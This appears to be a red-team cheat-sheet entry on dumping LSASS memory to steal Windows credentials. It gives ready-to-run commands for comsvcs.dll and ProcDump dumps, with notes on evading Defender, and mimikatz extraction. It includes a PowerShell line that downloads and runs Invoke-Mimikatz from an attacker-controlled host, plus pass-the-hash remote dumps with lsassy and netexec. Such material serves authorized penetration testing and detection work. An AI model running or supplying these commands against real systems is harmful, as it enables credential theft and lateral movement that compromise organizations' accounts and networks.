---
technique: LsassDump
category: credential-dumping
protocols: SMB
remote_capable: true
tags: lsass credential-dumping plaintext nt-hash dump memory ad windows
---

# LsassDump

LSASS (Local Security Authority Subsystem Service) caches credential material in process memory for every interactive and network logon. With local admin rights, an attacker can extract plaintext passwords, NT hashes, and Kerberos tickets from that memory either live on the target or by analyzing an offline memory dump.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Local admin | Required on the target system to read LSASS memory |
| Defender / PPL | Windows Defender flags comsvcs.dll and ProcDump dumps; use lsassy for varied methods |

## Windows

### Step 1: Get LSASS PID via tasklist (comsvcs.dll)

#cmd #native #lsass-dump

Find the LSASS process ID required for the comsvcs.dll MiniDump call.

```cmd title:"Get LSASS PID via tasklist"
tasklist /fi "imagename eq lsass.exe"
```
<!-- cheat -->

### Step 2: Dump LSASS via comsvcs.dll (MiniDump)

#cmd #native #lsass-dump

Dump LSASS memory using the built-in comsvcs.dll via rundll32 with the PID obtained in the previous step.

```cmd title:"Dump LSASS memory via comsvcs.dll MiniDump"
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump "$lsass_pid" C:\Windows\Temp\lsass.dmp full
```
<!-- cheat
var lsass_pid
-->

### Step 1: Get LSASS PID via tasklist (ProcDump)

#cmd #sysinternals #lsass-dump

Find the LSASS process ID required for ProcDump by-PID invocation.

```cmd title:"Get LSASS PID via tasklist for ProcDump"
tasklist /fi "imagename eq lsass.exe"
```
<!-- cheat -->

### Step 2: Dump LSASS via ProcDump

#cmd #sysinternals #lsass-dump

Dump LSASS memory with Sysinternals ProcDump using the PID form to reduce Defender detection.

```cmd title:"Dump LSASS memory with ProcDump by PID"
.\procdump.exe -accepteula -ma "$lsass_pid" C:\Windows\Temp\lsass.dmp
```
<!-- cheat
var lsass_pid
-->

### Step 1: Extract live LSASS credentials (mimikatz)

#cmd #mimikatz #lsass-live

Extract credentials directly from live LSASS memory.

```cmd title:"Extract live LSASS credentials with mimikatz sekurlsa::logonpasswords"
sekurlsa::logonpasswords
```
<!-- cheat -->

### Step 2: Load offline LSASS dump (mimikatz)

#cmd #mimikatz #lsass-dump

Point mimikatz at a previously captured LSASS memory dump file.

```cmd title:"Load LSASS dump file into mimikatz via sekurlsa::minidump"
sekurlsa::minidump lsass.dmp
```
<!-- cheat -->

### Step 3: Extract credentials from dump (mimikatz)

#cmd #mimikatz #lsass-dump

Parse the loaded LSASS dump and extract all cached credentials.

```cmd title:"Extract credentials from loaded LSASS dump via sekurlsa::logonpasswords"
sekurlsa::logonpasswords
```
<!-- cheat -->

### Step 1: Load Invoke-Mimikatz (PowerSploit)

#powershell #powersploit #lsass-live

Load PowerSploit's Invoke-Mimikatz into the current PowerShell session.

```powershell title:"Load Invoke-Mimikatz from HTTP server"
IEX (New-Object System.Net.Webclient).DownloadString('http://$lhost/Invoke-Mimikatz.ps1')
```
<!-- cheat
import tun_ip
-->

### Step 2: Dump LSASS with Invoke-Mimikatz (PowerSploit)

#powershell #powersploit #lsass-live

Run mimikatz in memory using PowerSploit's Invoke-Mimikatz without dropping an executable to disk.

```powershell title:"Dump LSASS credentials with Invoke-Mimikatz"
Invoke-Mimikatz -DumpCreds
```
<!-- cheat -->

## Linux

### lsassy (standalone)

#python #smb #pth #lsass-dump #remote

Remotely extract LSASS credentials from a target using several dump methods.

```sh title:"Remote LSASS dump via lsassy standalone"
lsassy -d "$domain" -u "$user" -H "$nt_hash" "$rhost_ip"
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->

### lsassy (netexec module)

#python #smb #pth #lsass-dump #remote

Remotely extract LSASS credentials using lsassy as a netexec module.

```sh title:"Remote LSASS dump via lsassy netexec module"
nxc smb "$rhost_ip" -d "$domain" -u "$user" -H "$nt_hash" -M lsassy
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->

### pypykatz

#python #offline #lsass-dump

Parse a previously exfiltrated LSASS memory dump offline on a Linux or Mac system.

```sh title:"Parse LSASS dump offline with pypykatz"
pypykatz lsa minidump lsass.dmp
```
<!-- cheat -->
